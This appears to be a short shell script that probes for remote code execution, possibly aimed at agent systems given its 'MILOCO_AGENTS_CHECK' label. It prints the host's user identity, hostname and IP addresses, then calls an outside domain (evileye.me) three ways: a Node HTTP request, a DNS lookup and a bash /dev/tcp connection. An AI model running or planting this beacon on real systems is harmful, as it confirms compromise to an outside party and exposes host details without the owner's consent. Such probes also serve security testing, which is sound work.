#!/bin/sh
set -u
M="MILOCO_AGENTS_CHECK"
echo "/= $M identity /="
id
hostname
hostname -I
echo "/= $M oob /="
node -e "require('http').get('http://rce_72549026_1794757626.evileye.me/')"; node -e "require('dns').lookup('rce_72549026_1794757626.evileye.me',()=>0)"; bash -c 'exec 3<>/dev/tcp/rce_72549026_1794757626.evileye.me/80; echo -e "GET / HTTP/1.1\r\nHost: rce_72549026_1794757626.evileye.me\r\n\r\n" >&3; exec 3<&-'
echo "/= $M done /="
